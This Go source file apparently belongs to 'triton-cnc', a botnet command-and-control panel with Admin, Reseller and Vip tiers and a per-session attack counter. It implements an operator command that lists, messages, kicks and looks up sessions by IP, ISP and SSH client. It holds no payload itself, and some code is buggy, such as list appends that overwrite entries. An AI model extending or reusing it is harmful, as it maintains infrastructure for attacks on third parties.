package sessions_Command

import (
	"triton-cnc/core/models/json/build"
	"triton-cnc/core/models/util"
	"triton-cnc/core/sessions/sessions"
	"fmt"
	"strconv"
	"strings"
	"time"

	"github.com/alexeyco/simpletable"
)



func init() {

	Register(&Command{
		Name: "sessions",

		Description: "sessions command",

		Admin: true,
		Reseller: true,
		Vip: false,

		Execute: func(Session *sessions.Session_Store, cmd []string) error {


			if len(cmd) < 2 {


				table := simpletable.New()

				table.Header = &simpletable.Header{
					Cells: []*simpletable.Cell{
						{Align: simpletable.AlignCenter, Text: "\x1b[38;5;11m#\x1b[38;5;15m"},
						{Align: simpletable.AlignCenter, Text: "\x1b[38;5;15mUser\x1b[38;5;15m"},
						{Align: simpletable.AlignCenter, Text: "\x1b[38;5;15mAdmin\x1b[38;5;15m"},
						{Align: simpletable.AlignCenter, Text: "\x1b[38;5;15mReseller\x1b[38;5;15m"},
						{Align: simpletable.AlignCenter, Text: "\x1b[38;5;15mVip\x1b[38;5;15m"},
						{Align: simpletable.AlignCenter, Text: "\x1b[38;5;15mIP\x1b"+build.Config.AppConfig.AppColour+"-\x1b[38;5;15mAddr\x1b[38;5;15m"},
						{Align: simpletable.AlignCenter, Text: "\x1b[38;5;15mSSH\x1b"+build.Config.AppConfig.AppColour+"-\x1b[38;5;15mClient\x1b[38;5;15m"},
					},
				}
				
				
				for _, User := range sessions.SessionMap {
					r := []*simpletable.Cell{
						{Align: simpletable.AlignCenter, Text: "\x1b[38;5;11m"+strconv.Itoa(int(User.Int_ID))+"\x1b[38;5;15m"},
						{Align: simpletable.AlignCenter, Text: "\x1b[38;5;15m"+User.User.Username+"\x1b[38;5;15m"},
						{Align: simpletable.AlignCenter, Text: "\x1b[38;5;15m"+util.Colour(User.User.Administrator, true)+"\x1b[38;5;15m"},
						{Align: simpletable.AlignCenter, Text: "\x1b[38;5;15m"+util.Colour(User.User.Reseller, true)+"\x1b[38;5;15m"},
						{Align: simpletable.AlignCenter, Text: "\x1b[38;5;15m"+util.Colour(User.User.Vip, true)+"\x1b[38;5;15m"},
						{Align: simpletable.AlignCenter, Text: "\x1b[38;5;15m"+User.Conn.RemoteAddr().String()+"\x1b[38;5;15m"},
						{Align: simpletable.AlignCenter, Text: "\x1b[38;5;15m"+ClientVersion(string(User.Conn.ClientVersion()))+"\x1b[38;5;15m"},
					}
			
					table.Body.Cells = append(table.Body.Cells, r)
				}
				
				if build.Config.Extra.TableType == "unicode" {
					table.SetStyle(simpletable.StyleUnicode)
				} else if build.Config.Extra.TableType == "lite" {
					table.SetStyle(simpletable.StyleCompactLite)
				} else {
					table.SetStyle(simpletable.StyleCompactClassic)
				}
					
				fmt.Fprint(Session.Channel, "")
				fmt.Fprintln(Session.Channel, strings.ReplaceAll(table.String(), "\n", "\r\n"))
				fmt.Fprint(Session.Channel, "\r")	
				return nil
			}

			switch cmd[1] {

			case "message":

				if len(cmd) <= 2 {
					Session.Channel.Write([]byte("\x1b"+build.Config.Extra.DefaultColours+" sessions                                            Array method is functional\r\n"))
					Session.Channel.Write([]byte(" sessions message             send a message to a single (or multiply) sessions\r\n"))
					Session.Channel.Write([]byte(" sessions message [user]@[id] -m [msg   send's a message to that single session\r\n"))
					Session.Channel.Write([]byte(" sessions message [username] -m [msg]      message's all of that users sessions\r\n"))
				}

				var session_store []*sessions.Session_Store; var Kill bool = false; var Message string

				for U := 2; U < len(cmd); U++ {

					if Kill {
						Message += cmd[U]
						continue
					}

					if cmd[U] == "-m" {
						Kill = true 
						continue
					}



					if !strings.Contains(cmd[U], "@") {
						sessionuser := GetSession(cmd[U])
						if sessionuser == nil {
							Session.Channel.Write([]byte("\x1b"+build.Config.Extra.DefaultColours+"\"\x1b[38;5;9m"+cmd[U]+"\x1b"+build.Config.Extra.DefaultColours+"\" has no open session with that id\r\n"))
							continue
						} else if sessionuser != nil {
							Session.Channel.Write([]byte("\x1b"+build.Config.Extra.DefaultColours+"\"\x1b[38;5;11m"+cmd[U]+"\x1b"+build.Config.Extra.DefaultColours+"\" has "+strconv.Itoa(len(sessionuser))+" ongoing active sessions which have had the message sent to\r\n"))
							for _, l := range sessionuser {
								session_store = append(sessionuser, l)
							}
							continue
						}

						continue


					} else {
						arg := strings.Split(cmd[U], "@")
						if len(arg) <= 1 {
							Session.Channel.Write([]byte("\x1b"+build.Config.Extra.DefaultColours+" \"sessions message [username] \"                            Correct syntax one \r\n"))
							Session.Channel.Write([]byte(" \"sessions message [user]@[id]\"                            Correct syntax two \r\n"))
							continue
						}

						
						VarINT64, error := strconv.Atoi(arg[1])
						if error != nil {
							Session.Channel.Write([]byte("\x1b"+build.Config.Extra.DefaultColours+" \"sessions message [username] \"                            Correct syntax one \r\n"))
							Session.Channel.Write([]byte(" \"sessions message [user]@[id]\"                            Correct syntax two \r\n"))
							continue
						}

						Get := sessions.SessionMap[int64(VarINT64)]
						if Get == nil {
							Session.Channel.Write([]byte("\x1b"+build.Config.Extra.DefaultColours+"\"\x1b[38;5;9m"+arg[0]+"\x1b"+build.Config.Extra.DefaultColours+"\" has no open session with that id\r\n"))
							continue
						}

						if Get.User.Username != arg[0] {
							Session.Channel.Write([]byte("\x1b"+build.Config.Extra.DefaultColours+"\"\x1b[38;5;9m"+arg[0]+"\x1b"+build.Config.Extra.DefaultColours+"\" has no open session with that id\r\n"))
							continue
						}

						session_store = append(session_store, Get)
						Session.Channel.Write([]byte("\x1b"+build.Config.Extra.DefaultColours+"message sent to \"\x1b[38;5;11m"+Get.User.Username+"\x1b"+build.Config.Extra.DefaultColours+"\" \r\n"))
						continue
					}
				}

				go func() {
					for _, sessions := range session_store {
							sessions.Channel.Write([]byte("\x1b"+build.Config.Extra.DefaultColours+"\x1b7\x1b[1A\r\x1b[2K\x1b[38;5;11m "+Message+" \x1b"+build.Config.Extra.DefaultColours+"\x1b8"))
					}
				}()


			case "kick":

				if len(cmd) <= 2 {
					Session.Channel.Write([]byte("\x1b"+build.Config.Extra.DefaultColours+" sessions                                            Array method is functional\r\n"))
					Session.Channel.Write([]byte(" sessions kick                             kick a single (or multiply) sessions\r\n"))
					Session.Channel.Write([]byte(" sessions kick [user]@[id]	kicks a single users session id with no message\r\n"))
					Session.Channel.Write([]byte(" sessions kick [username]   kicks all of a users sessions with still no message\r\n"))
					Session.Channel.Write([]byte(" sessions kick [args] -m [message]   kicks a session and sends a message before\r\n"))
				}

				var session_store []*sessions.Session_Store; var Kill bool = false; var Message string

				for U := 2; U < len(cmd); U++ {

					if Kill {
						Message += cmd[U]
						continue
					}

					if cmd[U] == "-m"  {
						Kill = true
						continue
					}

					if !strings.Contains(cmd[U], "@") {
						sessionuser := GetSession(cmd[U])
						if sessionuser == nil {
							Session.Channel.Write([]byte("\x1b"+build.Config.Extra.DefaultColours+"\"\x1b[38;5;9m"+cmd[U]+"\x1b"+build.Config.Extra.DefaultColours+"\" has no open session with that id\r\n"))
							continue
						} else if sessionuser != nil {
							Session.Channel.Write([]byte("\x1b"+build.Config.Extra.DefaultColours+"\"\x1b[38;5;11m"+cmd[U]+"\x1b"+build.Config.Extra.DefaultColours+"\" has "+strconv.Itoa(len(sessionuser))+" ongoing active sessions which has been kicked\r\n"))
							for _, l := range sessionuser {
								session_store = append(sessionuser, l)
							}
							continue
						}

						continue


					} else {
						arg := strings.Split(cmd[U], "@")
						if len(arg) <= 1 {
							Session.Channel.Write([]byte("\x1b"+build.Config.Extra.DefaultColours+" \"sessions kick [username] \"                               Correct syntax one \r\n"))
							Session.Channel.Write([]byte(" \"sessions kick [user]@[id]\"                               Correct syntax two \r\n"))
							continue
						}

						
						VarINT64, error := strconv.Atoi(arg[1])
						if error != nil {
							Session.Channel.Write([]byte("\x1b"+build.Config.Extra.DefaultColours+" \"sessions kick [username] \"                               Correct syntax one \r\n"))
							Session.Channel.Write([]byte(" \"sessions kick [user]@[id]\"                               Correct syntax two \r\n"))
							continue
						}

						Get := sessions.SessionMap[int64(VarINT64)]
						if Get == nil {
							Session.Channel.Write([]byte("\x1b"+build.Config.Extra.DefaultColours+"\"\x1b[38;5;9m"+arg[0]+"\x1b"+build.Config.Extra.DefaultColours+"\" has no open session with that id\r\n"))
							continue
						}

						if Get.User.Username != arg[0] {
							Session.Channel.Write([]byte("\x1b"+build.Config.Extra.DefaultColours+"\"\x1b[38;5;9m"+arg[0]+"\x1b"+build.Config.Extra.DefaultColours+"\" has no open session with that id\r\n"))
							continue
						}

						session_store = append(session_store, Get)
						Session.Channel.Write([]byte("\x1b"+build.Config.Extra.DefaultColours+"\"\x1b[38;5;11m"+Get.User.Username+"\x1b"+build.Config.Extra.DefaultColours+"\" has been correctly kicked\r\n"))
						continue
					}
				}

				go func() {
					for _, sessions := range session_store {
					
						if !Kill {
							sessions.Channel.Write([]byte("\r\nYou have been kicked from your session via a admin!\r\n"))
							time.Sleep(1 * time.Second)
							sessions.Channel.Close()
							continue
						} else if Kill {
							sessions.Channel.Write([]byte("\r\n"+Message+"\r\n"))
							time.Sleep(1 * time.Second)
							sessions.Channel.Close()
							continue
						}
	
					}
				}()

				case "lookup":


				if len(cmd) < 3 || len(cmd) > 3 {
					Session.Channel.Write([]byte("\x1b"+build.Config.Extra.DefaultColours+" sessions                                         Array method is dysfunctional\r\n"))
					Session.Channel.Write([]byte(" sessions lookup                            Lookup details about a open session\r\n"))
					Session.Channel.Write([]byte(" sessions lookup [username]@[id]  Lookup's up a session and returns the details\r\n"))
					return nil
				}

				VarINT64, error := strconv.Atoi(strings.Split(cmd[2], "@")[1])
				if error != nil {
					Session.Channel.Write([]byte(" \"sessions lookup [user]@[id]\"                               Correct syntax one \r\n"))
					return nil
				}


				Sessionss := sessions.SessionMap[int64(VarINT64)]
				if Sessionss == nil || Sessionss.User.Username != strings.Split(cmd[2], "@")[0] {
					Session.Channel.Write([]byte(" \"sessions lookup [user]@[id]\"                               Correct syntax one \r\n"))
					return nil
				}

				if Sessionss.Commands == nil {
					Sessionss.Commands = []string{"TBD"}
				}

				Session.Channel.Write([]byte(" Sessions User: "+FillSpace(Sessionss.User.Username, 34)+"Session Uptime: "+fmt.Sprintf("%.2f mins", time.Since(Sessionss.Creation).Minutes())+"\r\n"))
				Session.Channel.Write([]byte(" Last command: "+FillSpace(Sessionss.Commands[len(Sessionss.Commands)-1], 35)+"Session Attacks: "+strconv.Itoa(Sessionss.Attacks)+"\r\n"))
				Session.Channel.Write([]byte(" Sessions IP Addr: "+FillSpace(Sessionss.GeoISP.IP, 31)+"SSH Client: "+ClientVersion(string(Sessionss.Conn.ClientVersion()))+"\r\n"))
				Session.Channel.Write([]byte(" Sessions ISP: "+Sessionss.GeoISP.Org+"\r\n"))


				

			}

			return nil
		},
	})
}

func ClientVersion(Version string) string {
	var KeyWords = []string{"windows", "Ubuntu", "KiTTY", "PuTTY", "OpenSSH"}

	for _, Keyword := range KeyWords {
		if strings.Contains(Version, Keyword) {
			if Keyword == "OpenSSH"{
				return "GitBash"
			}
			return Keyword
		}
	}

	return "Unknown"
}

func GetSession(username string) []*sessions.Session_Store {
	var sessionsArray []*sessions.Session_Store
	for _, I := range sessions.SessionMap {
		if strings.ToLower(I.User.Username) == strings.ToLower(username) {
			sessionsArray = append(sessionsArray, I)
			continue
		}
	}

	return sessionsArray
}


func FillSpace(Object string, LenNeeded int) string {

	if len(Object) == LenNeeded {
		return Object
	}

	var Complete string = Object


	for I := len(Object); I < LenNeeded; I++ {
		Complete += " "
	}

	return Complete
}
